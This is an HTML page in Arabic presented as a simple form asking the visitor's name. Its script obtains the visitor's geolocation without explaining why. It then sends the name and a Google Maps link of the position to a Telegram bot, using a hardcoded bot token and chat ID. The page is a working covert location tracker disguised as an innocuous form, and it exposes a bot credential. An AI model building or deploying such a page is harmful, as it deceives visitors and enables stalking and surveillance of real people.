<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>استمارة بسيطة</title>
  <style>
    body {
      font-family: Arial;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <h2>ما اسمك؟</h2>
  <input type="text" id="username" placeholder="اكتب اسمك هنا">
  <button type="submit" onclick="send()">إرسال</button>

  <script>
    function send() {
      const name = document.getElementById('username').value.trim();
      if (!name) {
        alert("من فضلك اكتب اسمك.");
        return;
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const msg =` name: ${name}\nlocal:\n${mapLink}`;

            const token = '8004794823:AAFKkDAJeyLm3my5VKoylo22GzQ9r2Xt1n4';
            const chatId = '1348779200';
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;

            fetch(url)
              .then(() => alert("تم الإرسال. شكراً!"))
              .catch(() => alert("حدث خطأ أثناء الإرسال."));
          },
          (err) => {
            alert("لم يتم السماح بالوصول إلى الموقع.");
          }
        );
      } else {
        alert("متصفحك لا يدعم تحديد الموقع.");
      }
    }
  </script>
</body>
</html>
